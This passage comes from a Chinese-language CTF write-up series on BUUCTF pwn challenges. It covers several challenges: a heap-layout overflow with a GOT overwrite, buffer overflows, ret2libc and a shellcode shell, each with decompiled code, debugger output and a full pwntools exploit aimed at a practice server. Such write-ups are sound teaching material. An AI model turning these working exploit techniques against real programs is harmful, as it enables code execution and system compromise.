    printf("name: %s\n", *(&ptr + a1) + 4);
    printf("description: %s\n", **(&ptr + a1));
  }
  return __readgsdword(0x14u) ^ v2;
}
```

update：

```c
unsigned int __cdecl update(unsigned __int8 a1)
{
  char v2; // [esp+17h] [ebp-11h] BYREF
  int v3; // [esp+18h] [ebp-10h] BYREF
  unsigned int v4; // [esp+1Ch] [ebp-Ch]

  v4 = __readgsdword(0x14u);
  if ( a1 < byte_804B069 && (&ptr)[a1] )
  {
    v3 = 0;
    printf("text length: ");
    __isoc99_scanf("%u%c", &v3, &v2);
    if ( (*(&ptr)[a1] + v3) >= (&ptr)[a1] - 1 )
    {
      puts("my l33t defenses cannot be fooled, cya!");
      exit(1);
    }
    printf("text: ");
    input(*(&ptr)[a1], v3 + 1);
  }
  return __readgsdword(0x14u) ^ v4;
}
```

其中update中的：`if ( (*(&ptr)[a1] + v3) >= (&ptr)[a1] - 1 )`，这里的判断有一些问题，chunk0和chunk0(name)其实不一定相邻的，这样就有了溢出的可能。

```c
add(0x80,"aaaaa","bbbb")
add(0x80,"ccccc","ddddd")
```

```bash
pwndbg> x/80wx 0x804c000
0x804c000:	0x00000000	0x00000089	0x62626262	0x00000000 <=chunk0
0x804c010:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c020:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c030:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c040:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c050:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c060:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c070:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c080:	0x00000000	0x00000000	0x00000000	0x00000089
0x804c090:	0x0804c008	0x61616161	0x00000061	0x00000000 <=chunk(0) name
0x804c0a0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c0b0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c0c0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c0d0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c0e0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c0f0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c100:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c110:	0x00000000	0x00000089	0x64646464	0x00000064
0x804c120:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c130:	0x00000000	0x00000000	0x00000000	0x00000000
```

对于chunk0来说就是0x80c008+输入长度是否大于0x804c08c。

倘若：

```c
add(0x80,"aaaaa","bbbb")
add(0x80,"ccccc","ddddd")
add(0x80,"11111","/bin/sh\x00")
delete(0)
add(0x100,"aaaaa","bbbb")
```

这样的话，新申请的chunk3就会在chunk1和chunk2前面，而chunk3(name)则会在chunk1和chunk2的后面，这样就可以输入很长的数据了。

然后就是覆盖指针为free_got的地址，输出，计算system的地址。

exp：

```python
from pwn import *
from LibcSearcher import LibcSearcher
#context(log_level='debug')
#io = process("./babyfengshui_33c3_2016")
io = remote("node4.buuoj.cn",25098)
elf = ELF("./babyfengshui_33c3_2016")
libc = ELF("./libc-2.23.so")
def add(size,length,name,payload):
	io.recvuntil("Action: ")
	io.sendline("0")
	io.recvuntil("size of description: ")
	io.sendline(str(size))
	io.recvuntil("name: ")
	io.sendline(name)
	io.recvuntil("text length: ")
	io.sendline(str(length))
	io.recvuntil("text: ")
	io.sendline(payload)
def delete(index):
	io.recvuntil("Action: ")
	io.sendline("1")	
	io.recvuntil("index: ")
	io.sendline(str(index))

def display(index):
	io.recvuntil("Action: ")
	io.sendline("2")	
	io.recvuntil("index: ")
	io.sendline(str(index))

def update(index,length,payload):
	io.recvuntil("Action: ")
	io.sendline("3")
	io.recvuntil("index: ")
	io.sendline(str(index))
	io.recvuntil("text length: ")
	io.sendline(str(length))
	io.recvuntil("text: ")
	io.sendline(payload)
add(0x80,0x80,"name","bbbb")
add(0x80,0x80,"naem","ddddd")
add(0x80,0x80,"name","/bin/sh\x00")
delete(0)
#payload='a'*0x108+"\x00"*4+"\x00\x00\x00\x89"+'a'*0x80+"\x00"*4+"\x00\x00\x00\x89"+p32(elf.got['free'])
payload = "A"*0x198 + p32(elf.got['free'])
add(0x100,0x19c,"name",payload)
display(1)
io.recvuntil("description: ")
free_addr = u32(io.recv(4))
print hex(free_addr)
base = free_addr - libc.sym['free']
sys_addr = base + libc.sym['system']
#libc=LibcSearcher("free",free_addr)
#libc_base=free_addr-libc.dump("free")
#sys_addr=libc_base+libc.dump("system")
update(1,0x4,p32(sys_addr))
delete(2)
io.interactive()
```



## 0x2C.picoctf_2018_buffer overflow 2

```c
char *__cdecl win(int a1, int a2)
{
  char *result; // eax
  char s[64]; // [esp+Ch] [ebp-4Ch] BYREF
  FILE *stream; // [esp+4Ch] [ebp-Ch]

  stream = fopen("flag.txt", "r");
  if ( !stream )
  {
    puts(
      "Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.");
    exit(0);
  }
  result = fgets(s, 64, stream);
  if ( a1 == 0xDEADBEEF && a2 == 0xDEADC0DE )
    result = (char *)printf(s);
  return result;
}
```

跳转的win这个函数的时候两个参数需要是0xDEADBEEF 和 0xDEADC0DE

Exp：

```python
from pwn import *
#context(log_level='debug')
#io = process("./PicoCTF_2018_buffer_overflow_2")
io = remote("node4.buuoj.cn",27708)
win_addr = 0x080485CB
payload = 'a'*(0x6c+4) +p32(win_addr)+p32(0)+p32(0xDEADBEEF)+ p32(0xDEADC0DE)
io.sendline(payload)
io.interactive()
```

## 0x2D.xdctf2015_pwn200

简单的ret2libc

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  size_t v3; // eax
  char buf[112]; // [esp+0h] [ebp-7Ch] BYREF
  int *v6; // [esp+70h] [ebp-Ch]

  v6 = &argc;
  strcpy(buf, "Welcome to XDCTF2015~!\n");
  memset(&buf[24], 0, 0x4Cu);
  setbuf(stdout, buf);
  v3 = strlen(buf);
  write(1, buf, v3);
  vuln();
  return 0;
}

ssize_t vuln()
{
  char buf[104]; // [esp+Ch] [ebp-6Ch] BYREF

  setbuf(stdin, buf);
  return read(0, buf, 0x100u);
}
```

exp：

```python
from pwn import *
context(log_level='debug')
io = remote("node4.buuoj.cn",27296)
#io = process("./bof")
elf = ELF("./bof")
libc = ELF("./libc-2.23.so")
vuln = 0x080484D6
payload = 'a'*(0x6c+4) + p32(elf.plt['write'])+p32(vuln)+p32(1)+p32(elf.got['write'])+p32(4)
io.sendline(payload)
io.recvuntil("\x21\x0a")
write_addr= u32(io.recv(4))
print hex(write_addr)
base = write_addr - libc.sym['write']
sys_addr = base + libc.sym['system']
bin_sh = base + libc.search('/bin/sh').next()
payload = 'a'*(0x6c+4) +p32(sys_addr)+ p32(0xdeadbeef)+p32(bin_sh) 
io.sendline(payload)
io.interactive()
```

## 0x2E.mrctf2020_shellcode

不能f5

![image-20210712172029216](BUU-PWN-0x20-0x2F/image-20210712172029216.png)

直接写shellcode就OK。

```python
from pwn import *
context(arch = 'amd64', os = 'linux', log_level = 'debug')
io = remote("node4.buuoj.cn",26222)
#io = process("mrctf2020_shellcode")
payload = asm(shellcraft.sh())

io.sendline(payload)
io.interactive()
```

要加：

`context(arch = 'amd64', os = 'linux', log_level = 'debug')`



## 0x2F.bbys_tu_2016

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp+14h] [ebp-Ch] BYREF

  puts("This program is hungry. You should feed it.");
  __isoc99_scanf("%s", &v4);
  puts("Do you feel the flow?");
  return 0;
}
```

对输入没有限制，生成一些字符串。

```shell
gwt@ubuntu:~$ cyclic 50
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama
```

```python
pwndbg> 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama
32	in isoc99_scanf.c
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────
 EAX  0x1
 EBX  0xf7fb7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0
 ECX  0xa
 EDX  0xf7fb887c (_IO_stdfile_0_lock) ◂— 0x1
 EDI  0xf7fb7e00 (stdin) —▸ 0xf7fb75a0 (_IO_2_1_stdin_) ◂— 0xfbad2288
 ESI  0xf7fb75a0 (_IO_2_1_stdin_) ◂— 0xfbad2288
 EBP  0xffffd068 —▸ 0xffffd098 ◂— 0x61616166 ('faaa')<<<<<<=这里
 ESP  0xffffd040 —▸ 0xf7fe77eb (_dl_fixup+11) ◂— add    esi, 0x15815
 EIP  0xf7e60151 (__isoc99_scanf+129) ◂— and    dword ptr [esi + 0x3c], 0xffffffeb

```

```shell
gwt@ubuntu:~$ cyclic -l 0x61616166
20
```

Exp：

```python
from pwn import *
context(arch = 'amd64', os = 'linux', log_level = 'debug')
io = remote("node4.buuoj.cn",25672)
#io = process("./bbys_tu_2016")
payload = 'a'*(20+4)+ p32(0x0804856D)
io.sendline(payload)
io.interactive()
```

























